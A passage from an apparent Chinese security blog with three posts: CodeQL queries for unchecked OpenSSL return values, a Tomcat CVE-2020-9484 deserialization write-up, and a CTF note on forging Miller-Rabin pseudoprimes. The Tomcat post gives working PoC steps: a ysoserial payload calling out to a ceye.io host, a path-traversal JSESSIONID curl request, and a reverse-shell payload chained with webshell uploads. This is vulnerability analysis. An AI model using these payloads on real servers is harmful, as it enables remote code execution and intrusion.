class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> clen = <span class="number">0</span>;</span><br><span class="line">    *key = RSA_new();</span><br><span class="line">    <span class="keyword">switch</span> (idx) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        clen = key1(*key, ctext);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        clen = key2(*key, ctext);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        clen = key3(*key, ctext);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于在测试代码里，所以问题不大，不过还是提了个issue，开发者也很快补上了(<a href="https://github.com/openssl/openssl/issues/13361">https://github.com/openssl/openssl/issues/13361</a>)</p><h3><span id="psi-lu-1">思路1</span><a href="#psi-lu-1" class="header-anchor">#</a></h3><blockquote><p>思路1：从文档的描述里知道某个函数的返回值是需要进行检查的，例如<code>openssl文档中</code>，通过下面的描述知道<code>RSA_new</code>在返回NULL的时候是出现了错误，因此需要进行检查</p></blockquote><p>我们前面已知对<code>RSA_new</code>的返回值需要进行检查，虽然直接找就找到了17个，看起来也很快，但是当函数很多，结果很多的时候，就有点浪费时间了，我们最好是让查询脚本只找到最后一个结果，也就是降低误报率</p><p>简单的看下17个，可以发现大部分都是一个变量接住返回值，然后进行检查，因此我们可以很快的写出下面的查询脚本</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.controlflow.Guards</span><br><span class="line">import semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">predicate check_name(Function func) &#123; func.getName().matches("RSA_new") &#125;</span><br><span class="line"></span><br><span class="line">from FunctionCall func, GuardCondition cond</span><br><span class="line">where</span><br><span class="line">  check_name(func.getTarget()) and</span><br><span class="line">  exists(DataFlow::Node source, DataFlow::Node sink, int diff |</span><br><span class="line">    DataFlow::localFlow(source, sink) and</span><br><span class="line">    source.asExpr().(FunctionCall) = func and</span><br><span class="line">    cond.getAChild*() = sink.asExpr() and</span><br><span class="line">    diff = sink.getLocation().getEndLine() - source.getLocation().getEndLine() and</span><br><span class="line">    diff &gt;= 0 and</span><br><span class="line">    diff &lt; 10</span><br><span class="line">  )</span><br><span class="line"><span class="keyword">select</span> func,func.getLocation()</span><br></pre></td></tr></table></figure><p>本来我们应该要查<code>not exists</code>的，但是由于查<code>not exsits</code>的搜索空间更大，耗时间也耗计算资源，所以我们直接差<code>exsits</code>，然后和一开始的17个结果区差集，就是<code>not exsits</code>的结果。</p><p>查询脚本的内容很简单，首先还是找函数调用，检查是不是<code>RSA_new</code>这个函数，然后找是不是存在函数内数据流，<code>source</code>点是函数调用，<code>sink</code>点是变量的使用点，这个变量的使用点还必须是在一个条件语句中的，最后简单的通过行数差来看是不是一个检查点(因为一般check点都不会很远)。更加合理的方法是写成找最近的条件语句<code>sink</code>点，这样我们查询到的<code>exsits</code>结果有14个，如下</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-11-12-094216.jpg" alt="image-20201112154309358"></p><p><code>not exsits</code>的3个中，两个误报的情况分别如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// case 1</span></span><br><span class="line">loopargs[i].rsa_key[testnum] = RSA_new();</span><br><span class="line"><span class="keyword">if</span> (loopargs[i].rsa_key[testnum] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">     BN_free(bn);</span><br><span class="line">     <span class="keyword">goto</span> <span class="built_in">end</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//case 2</span></span><br><span class="line">*pval = (ASN1_VALUE *)RSA_new();</span><br><span class="line"><span class="keyword">if</span> (*pval != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>问题的原因在于<code>codeql</code>没有提取到if中对变量的使用这个<code>sink</code>点(通过去掉判断打印出sink点可以发现，不过今天下载了最新的codeql重新编译了数据库，case2已经可以识别出来了)，如果大家感兴趣，可以继续修改查询语句看怎么去除这两个误报，也欢迎一起讨论解决。</p><h3><span id="psi-lu-2">思路2</span><a href="#psi-lu-2" class="header-anchor">#</a></h3><blockquote><p>当一个函数，在项目中被多次使用，大部分都检查了返回值，那么这个函数的返回值大概率是要被检查的，而没检查的地方就是<code>Unchecked Return Value</code></p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.controlflow.Guards</span><br><span class="line">import semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">predicate check_name(Function func) &#123; func.getName().matches("RSA_new") &#125;</span><br><span class="line"></span><br><span class="line">from FunctionCall func, int total, int checked</span><br><span class="line">where</span><br><span class="line">  check_name(func.getTarget()) and</span><br><span class="line">  total = count(FunctionCall fc | check_name(fc.getTarget())) and</span><br><span class="line">  checked =</span><br><span class="line">    count(FunctionCall fc |</span><br><span class="line">      check_name(fc.getTarget()) and</span><br><span class="line">      exists(DataFlow::Node source, DataFlow::Node sink, int diff, GuardCondition cond |</span><br><span class="line">        DataFlow::localFlow(source, sink) and</span><br><span class="line">        source.asExpr().(FunctionCall) = fc and</span><br><span class="line">        cond.getAChild*() = sink.asExpr() and</span><br><span class="line">        diff = sink.getLocation().getEndLine() - source.getLocation().getEndLine() and</span><br><span class="line">        diff &gt;= 0 and</span><br><span class="line">        diff &lt; 10</span><br><span class="line">      )</span><br><span class="line">    ) and</span><br><span class="line">  checked != total and</span><br><span class="line">  checked * 100 / total &gt;= 80 and</span><br><span class="line">  exists(DataFlow::Node source, DataFlow::Node sink, int diff, GuardCondition cond |</span><br><span class="line">    DataFlow::localFlow(source, sink) and</span><br><span class="line">    source.asExpr().(FunctionCall) = func and</span><br><span class="line">    cond.getAChild*() = sink.asExpr() and</span><br><span class="line">    diff = sink.getLocation().getEndLine() - source.getLocation().getEndLine() and</span><br><span class="line">    diff &gt;= 0 and</span><br><span class="line">    diff &lt; 10</span><br><span class="line">  )</span><br><span class="line"><span class="keyword">select</span> func, func.getLocation()</span><br></pre></td></tr></table></figure><p>在思路2的查询脚本中，我们先是统计了全局使用了<code>RSA_new</code>几次(<code>total=...</code>)，然后统计了有几次使用后进行了检查(<code>checked=...</code>)，然后设置了阈值为<code>80%</code>，最后，当本身未进行检查时，将结果给出，同样这里还是选择用<code>exsits</code>取差集代替<code>not exsits</code>，结果如下</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-11-12-094227.jpg" alt="image-20201112172859336"></p><p>可以看到依旧是找到了14个存在检查的，差集中存在2个误报。</p><h3><span id="pzong-jie">总结</span><a href="#pzong-jie" class="header-anchor">#</a></h3><p>不管是思路1还是思路2，其实在自动化上都存在一定困难。</p><ol><li>对于思路1，难点在于没有好的方法去知道某API需要进行返回值检查，有的选择正则表达式在文档里找，也有选择用NLP方法去从文档里提取信息，但仍然有很长的路要走，是个难点，而且有文档的项目毕竟还是少数</li><li>对于思路2，阈值的设置是个问题，和项目中API的使用数量等挂钩，而且并不能保证不检查就一定有问题，只是大概率有问题而已</li></ol><p>参考资料：</p><ul><li><p><a href="https://cwe.mitre.org/data/definitions/252.html">CWE-252</a></p></li><li><p><a href="https://github.com/github/codeql">CodeQL</a></p></li></ul>]]></content>
      <categories>
        <category>research</category>
        <category>codeql</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-9484</title>
    <url>/de7e28a5.html</url>
    <content><![CDATA[<blockquote><p>When using Apache Tomcat versions 10.0.0-M1 to 10.0.0-M4, 9.0.0.M1 to 9.0.34, 8.5.0 to 8.5.54 and 7.0.0 to 7.0.103 if a) an attacker is able to control the contents and name of a file on the server; and b) the server is configured to use the PersistenceManager with a FileStore; and c) the PersistenceManager is configured with sessionAttributeValueClassNameFilter=“null” (the default unless a SecurityManager is used) or a sufficiently lax filter to allow the attacker provided object to be deserialized; and d) the attacker knows the relative file path from the storage location used by FileStore to the file the attacker has control over; then, using a specifically crafted request, the attacker will be able to trigger remote code execution via deserialization of the file under their control. Note that all of conditions a) to d) must be true for the attack to succeed.</p></blockquote><a id="more"></a><h3><span id="pgong-ji-tiao-jian">攻击条件</span><a href="#pgong-ji-tiao-jian" class="header-anchor">#</a></h3><ul><li><p>存在文件上传(文件后缀为<code>.session</code>)</p></li><li><p>启用了<code>tomcat</code>的<code>session</code>持久化功能，在<code>conf/context.xml</code>中开启</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Manager</span> <span class="attr">className</span>=<span class="string">"org.apache.catalina.session.PersistentManager"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">debug</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">saveOnRestart</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">maxActiveSession</span>=<span class="string">"-1"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">minIdleSwap</span>=<span class="string">"-1"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">maxIdleSwap</span>=<span class="string">"-1"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">maxIdleBackup</span>=<span class="string">"-1"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Store</span> <span class="attr">className</span>=<span class="string">"org.apache.catalina.session.FileStore"</span> <span class="attr">directory</span>=<span class="string">"./session"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Manager</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Context</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>tomcat/lib</code>或<code>WEB-INF/lib</code>下存在能够利用的反序列化<code>gadget</code></p></li></ul><h3><span id="plou-dong-yuan-li">漏洞原理</span><a href="#plou-dong-yuan-li" class="header-anchor">#</a></h3><p><code>org.apache.catalina.session.FileStore</code>在使用<code>load</code>函数读取<code>.session</code>文件时，<code>file</code>函数未对<code>/../</code>路径穿越进行过滤</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Session <span class="title">load</span><span class="params">(String id)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">    <span class="comment">// Open an input stream to the specified pathname, if any</span></span><br><span class="line">    File file = file(id); <span class="comment">//file函数路径穿越</span></span><br><span class="line">    <span class="keyword">if</span> (file == <span class="keyword">null</span> || !file.exists()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Context context = getManager().getContext();</span><br><span class="line">    Log contextLog = context.getLogger();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (contextLog.isDebugEnabled()) &#123;</span><br><span class="line">        contextLog.debug(sm.getString(getStoreName()+<span class="string">".loading"</span>, id, file.getAbsolutePath()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ClassLoader oldThreadContextCL = context.bind(Globals.IS_SECURITY_ENABLED, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> (FileInputStream fis = <span class="keyword">new</span> FileInputStream(file.getAbsolutePath());</span><br><span class="line">            ObjectInputStream ois = getObjectInputStream(fis)) &#123;</span><br><span class="line"></span><br><span class="line">        StandardSession session = (StandardSession) manager.createEmptySession();</span><br><span class="line">        session.readObjectData(ois);</span><br><span class="line">        session.setManager(manager);</span><br><span class="line">        <span class="keyword">return</span> session;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (contextLog.isDebugEnabled()) &#123;</span><br><span class="line">            contextLog.debug(<span class="string">"No persisted data file found"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        context.unbind(Globals.IS_SECURITY_ENABLED, oldThreadContextCL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>file</code>函数存在路径穿越，因此在请求时可以构造<code>JSESSIONID</code>使得它可以读到任意位置的<code>.session</code>文件进行反序列化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">@@ -<span class="number">336</span>,<span class="number">11</span> +<span class="number">342</span>,<span class="number">20</span> @@ <span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">FileStore</span> <span class="keyword">extends</span> <span class="title">StoreBase</span> </span>&#123;</span><br><span class="line">      *    used in the file naming.</span><br><span class="line">      */</span><br><span class="line">     <span class="function"><span class="keyword">private</span> File <span class="title">file</span><span class="params">(String id)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">-        <span class="keyword">if</span> (<span class="keyword">this</span>.directory == <span class="keyword">null</span>) &#123;</span><br><span class="line">+        File storageDir = directory();</span><br><span class="line">+        <span class="keyword">if</span> (storageDir == <span class="keyword">null</span>) &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">         &#125;</span><br><span class="line">+</span><br><span class="line">         String filename = id + FILE_EXT;</span><br><span class="line">-        File file = <span class="keyword">new</span> File(directory(), filename);</span><br><span class="line">+        File file = <span class="keyword">new</span> File(storageDir, filename);</span><br><span class="line">+</span><br><span class="line">+        <span class="comment">// Check the file is within the storage directory</span></span><br><span class="line">+        <span class="keyword">if</span> (!file.getCanonicalPath().startsWith(storageDir.getCanonicalPath())) &#123;</span><br><span class="line">+            log.warn(sm.getString(<span class="string">"fileStore.invalid"</span>, file.getPath(), id));</span><br><span class="line">+            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">+        &#125;</span><br><span class="line">+</span><br><span class="line">         <span class="keyword">return</span> file;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-10-28-020626.png" alt="image-20201028100213679"></p><p>由于当前类加载器破坏了双亲委托模型的隐式加载，<code>Thread.currentThread().getContextClassLoader()</code>可以加载到<code>WEB-INF/lib</code>下的依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> ObjectInputStream <span class="title">getObjectInputStream</span><span class="params">(InputStream is)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    BufferedInputStream bis = <span class="keyword">new</span> BufferedInputStream(is);</span><br><span class="line"></span><br><span class="line">    CustomObjectInputStream ois;</span><br><span class="line">    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (manager <span class="keyword">instanceof</span> ManagerBase) &#123;</span><br><span class="line">        ManagerBase managerBase = (ManagerBase) manager;</span><br><span class="line">        ois = <span class="keyword">new</span> CustomObjectInputStream(bis, classLoader, manager.getContext().getLogger(),</span><br><span class="line">                managerBase.getSessionAttributeValueClassNamePattern(),</span><br><span class="line">                managerBase.getWarnOnSessionAttributeFilterFailure());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ois = <span class="keyword">new</span> CustomObjectInputStream(bis, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ois;</span><br></pre></td></tr></table></figure><h3><span id="ppoc-yan-zheng">POC验证</span><a href="#ppoc-yan-zheng" class="header-anchor">#</a></h3><ul><li><p>STEP1: 配置<code>context.xml</code>文件，允许<code>session</code>持久化</p></li><li><p>STEP2: 生成<code>payload</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar URLDNS  &quot;http:&#x2F;&#x2F;xxxxxx.ceye.io&quot; &gt; poc.session</span><br></pre></td></tr></table></figure></li><li><p>STEP3:将<code>poc.session</code>放入某路径下(<code>path</code>)</p></li><li><p>STEP4:<code>curl</code>触发</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -k &#39;https:&#x2F;&#x2F;ip:port&#x2F;xxxxx.jsp&#39; -H &#39;Cookie: JSESSIONID&#x3D;..&#x2F;..&#x2F;..&#x2F;path&#x2F;poc&#39;</span><br></pre></td></tr></table></figure><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-10-28-021800.png" alt="image-20201028101800742"></p></li></ul><h3><span id="prce-gong-ji">RCE攻击</span><a href="#prce-gong-ji" class="header-anchor">#</a></h3><p>结合<code>tomcat</code>的其他漏洞：例如文件上传(<code>CVE-2017-12615/CVE-2017-12617</code>)上传<code>webshell</code>，在确保<code>tomcat/lib</code>或<code>WEB-INF/lib</code>下存在反序列化依赖时，可以使用<code>ysoserial.jar</code>构造反序列化反弹<code>shell</code></p><p>例如：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar Groovy1 &quot;python shell.py&quot; &gt; poc.session</span><br></pre></td></tr></table></figure><h3><span id="pcan-kao">参考</span><a href="#pcan-kao" class="header-anchor">#</a></h3><ul><li><a href="https://mp.weixin.qq.com/s/OGdHSwqydiDqe-BUkheTGg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/OGdHSwqydiDqe-BUkheTGg</a></li><li><a href="https://github.com/apache/tomcat/commit/bb33048e3f9b4f2b70e4da2e6c4e34ca89023b1b" target="_blank" rel="noopener">https://github.com/apache/tomcat/commit/bb33048e3f9b4f2b70e4da2e6c4e34ca89023b1b</a></li><li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></li></ul>]]></content>
      <categories>
        <category>CTF</category>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>Bypass Miller Rabin Test</title>
    <url>/b7ee330c.html</url>
    <content><![CDATA[<blockquote><p>在一道密码学题目中碰到的问题，需要绕过Miller-Rabin素性测试，稍微记录一下</p></blockquote><a id="more"></a><p>题目要求在<code>2**600</code>到<code>2**900</code>范围内找到一个数，这个数不是质数，但可以通过<code>Miller-Rabin</code>素性测试</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_basis</span><span class="params">(n)</span>:</span></span><br><span class="line">    basis = [<span class="literal">True</span>] * n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, int(n**<span class="number">0.5</span>)+<span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> basis[i]:</span><br><span class="line">            basis[i*i::<span class="number">2</span>*i] = [<span class="literal">False</span>]*((n-i*i<span class="number">-1</span>)//(<span class="number">2</span>*i)+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">2</span>] + [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, n, <span class="number">2</span>) <span class="keyword">if</span> basis[i]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">miller_rabin</span><span class="params">(n, b)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Miller Rabin test testing over all</span></span><br><span class="line"><span class="string">    prime basis &lt; b</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    basis = generate_basis(b)</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">2</span> <span class="keyword">or</span> n == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    r, s = <span class="number">0</span>, n - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        r += <span class="number">1</span></span><br><span class="line">        s //= <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> basis:</span><br><span class="line">        x = pow(b, s, n)</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">1</span> <span class="keyword">or</span> x == n - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(r - <span class="number">1</span>):</span><br><span class="line">            x = pow(x, <span class="number">2</span>, n)</span><br><span class="line">            <span class="keyword">if</span> x == n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">  </span><br><span class="line">miller_rabin(p,<span class="number">64</span>)</span><br></pre></td></tr></table></figure><p>从虽然从参考资料中的论文给出了一些示例，但都不符合题目的限制，不过好在参考资料的<code>appendix A</code>里给了十分完整的示例，可以对着复现和验证</p><p>假设我们的伪素数$n = p_1 p_2…p_h$，其中$p_i$是不同的素数，使得$n$是基${a_1,a_2…a_t}$下的伪素数，在本文中，$h=3$</p><p>论文中的方法是先找到一个$p_1$，然后生成$p_i = k_i(p_i-1)+1$，最后合成伪素数$n$</p><p>找$p_1$的步骤如下</p><h3><span id="pstep1-qiu-sa">Step1：求Sa</span><a href="#pstep1-qiu-sa" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-10-09-123315.png" alt="image-20201009203311692"></p><p>显然对于<code>miller_rabin(p,64)</code>而言，我们的<code>A</code>为64以下的所有质数，求<code>A</code>如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_basis</span><span class="params">(n)</span>:</span></span><br><span class="line">    basis = [<span class="literal">True</span>] * n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, int(n**<span class="number">0.5</span>)+<span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> basis[i]:</span><br><span class="line">            basis[i*i::<span class="number">2</span>*i] = [<span class="literal">False</span>]*((n-i*i<span class="number">-1</span>)//(<span class="number">2</span>*i)+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">2</span>] + [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, n, <span class="number">2</span>) <span class="keyword">if</span> basis[i]]</span><br><span class="line"></span><br><span class="line">A = generate_basis(<span class="number">64</span>)</span><br><span class="line">print(<span class="string">'A:'</span>, A)</span><br><span class="line"><span class="comment"># [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61]</span></span><br></pre></td></tr></table></figure><p>而我们要求的<code>Sa</code>集合，它要求，对于每个基<code>a</code>，在<code>3~(4*a-1)</code>范围内所有与<code>a</code>的<code>Jacobi</code>结果为<code>-1</code>的数字的集合，如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Sa = &#123;&#125;</span><br><span class="line">print(<span class="string">"Sa: "</span>)</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> A:</span><br><span class="line">    Sa[a] = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">4</span>*a<span class="number">-1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> libnum.jacobi(a, _) == <span class="number">-1</span>:</span><br><span class="line">            Sa[a].append(_)</span><br><span class="line">    print(a, Sa[a])</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Sa:</span></span><br><span class="line"><span class="string">2 [3, 5]</span></span><br><span class="line"><span class="string">3 [5, 7]</span></span><br><span class="line"><span class="string">5 [3, 7, 13, 17]</span></span><br><span class="line"><span class="string">7 [5, 11, 13, 15, 17, 23]</span></span><br><span class="line"><span class="string">11 [3, 13, 15, 17, 21, 23, 27, 29, 31, 41]</span></span><br><span class="line"><span class="string">13 [5, 7, 11, 15, 19, 21, 31, 33, 37, 41, 45, 47]</span></span><br><span class="line"><span class="string">17 [3, 5, 7, 11, 23, 27, 29, 31, 37, 39, 41, 45, 57, 61, 63, 65]</span></span><br><span class="line"><span class="string">19 [7, 11, 13, 21, 23, 29, 33, 35, 37, 39, 41, 43, 47, 53, 55, 63, 65, 69]</span></span><br><span class="line"><span class="string">23 [3, 5, 17, 21, 27, 31, 33, 35, 37, 39, 45, 47, 53, 55, 57, 59, 61, 65, 71, 75, 87, 89]</span></span><br><span class="line"><span class="string">29 [3, 11, 15, 17, 19, 21, 27, 31, 37, 39, 41, 43, 47, 55, 61, 69, 73, 75, 77, 79, 85, 89, 95, 97, 99, 101, 105, 113]</span></span><br><span class="line"><span class="string">31 [7, 13, 17, 19, 21, 29, 35, 37, 39, 47, 51, 53, 57, 59, 61, 63, 65, 67, 71, 73, 77, 85, 87, 89, 95, 103, 105, 107, 111, 117]</span></span><br><span class="line"><span class="string">37 [5, 13, 15, 17, 19, 23, 29, 31, 35, 39, 43, 45, 51, 55, 57, 59, 61, 69, 79, 87, 89, 91, 93, 97, 103, 105, 109, 113, 117, 119, 125, 129, 131, 133, 135, 143]</span></span><br><span class="line"><span class="string">41 [3, 7, 11, 13, 15, 17, 19, 27, 29, 35, 47, 53, 55, 63, 65, 67, 69, 71, 75, 79, 85, 89, 93, 95, 97, 99, 101, 109, 111, 117, 129, 135, 137, 145, 147, 149, 151, 153, 157, 161]</span></span><br><span class="line"><span class="string">43 [5, 11, 15, 23, 29, 31, 33, 35, 37, 45, 47, 59, 61, 65, 67, 69, 73, 77, 79, 83, 85, 87, 89, 93, 95, 99, 103, 105, 107, 111, 113, 125, 127, 135, 137, 139, 141, 143, 149, 157, 161, 167]</span></span><br><span class="line"><span class="string">47 [3, 5, 7, 13, 27, 29, 33, 41, 45, 51, 55, 57, 59, 63, 69, 71, 73, 75, 77, 79, 83, 85, 93, 95, 103, 105, 109, 111, 113, 115, 117, 119, 125, 129, 131, 133, 137, 143, 147, 155, 159, 161, 175, 181, 183, 185]</span></span><br><span class="line"><span class="string">53 [3, 5, 19, 21, 23, 27, 31, 33, 35, 39, 41, 45, 51, 55, 61, 65, 67, 71, 73, 75, 79, 83, 85, 87, 101, 103, 109, 111, 125, 127, 129, 133, 137, 139, 141, 145, 147, 151, 157, 161, 167, 171, 173, 177, 179, 181, 185, 189, 191, 193, 207, 209]</span></span><br><span class="line"><span class="string">59 [3, 7, 13, 15, 19, 27, 33, 35, 37, 51, 61, 63, 65, 69, 71, 73, 75, 77, 79, 87, 89, 93, 95, 97, 101, 107, 109, 113, 117, 119, 123, 127, 129, 135, 139, 141, 143, 147, 149, 157, 159, 161, 163, 165, 167, 171, 173, 175, 185, 199, 201, 203, 209, 217, 221, 223, 229, 233]</span></span><br><span class="line"><span class="string">61 [7, 11, 17, 21, 23, 29, 31, 33, 35, 37, 43, 51, 53, 55, 59, 63, 67, 69, 71, 79, 85, 87, 89, 91, 93, 99, 101, 105, 111, 115, 129, 133, 139, 143, 145, 151, 153, 155, 157, 159, 165, 173, 175, 177, 181, 185, 189, 191, 193, 201, 207, 209, 211, 213, 215, 221, 223, 227, 233, 237]</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3><span id="pstep2-qiu-sb">Step2：求Sb</span><a href="#pstep2-qiu-sb" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-10-09-124919.png" alt="image-20201009204918929"></p><p>在求<code>Sb</code>前，我们需要先指定$k_i$的值(只要是质数就行)，这里我们指定$k_2 = 701、k_3 = 257$</p><p>我们可以看到<code>Sb</code>其实就是取了一个$k_i^{-1}(Sa+k_i-1)$的交集</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">"Sb:"</span>)</span><br><span class="line">Sb = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> A:</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> Sa[a]:</span><br><span class="line">        <span class="keyword">if</span>((k2*(b<span class="number">-1</span>)+<span class="number">1</span>) % (<span class="number">4</span>*a) <span class="keyword">in</span> Sa[a] <span class="keyword">and</span> (k3*(b<span class="number">-1</span>)+<span class="number">1</span>) % (<span class="number">4</span>*a) <span class="keyword">in</span> Sa[a]):</span><br><span class="line">            result.append(b)</span><br><span class="line">        Sb[a]=result</span><br><span class="line">    print(a,Sb[a])</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Sb:</span></span><br><span class="line"><span class="string">2 [3, 5]</span></span><br><span class="line"><span class="string">3 [7]</span></span><br><span class="line"><span class="string">5 [7, 17]</span></span><br><span class="line"><span class="string">7 [11, 13, 15]</span></span><br><span class="line"><span class="string">11 [17, 23, 41]</span></span><br><span 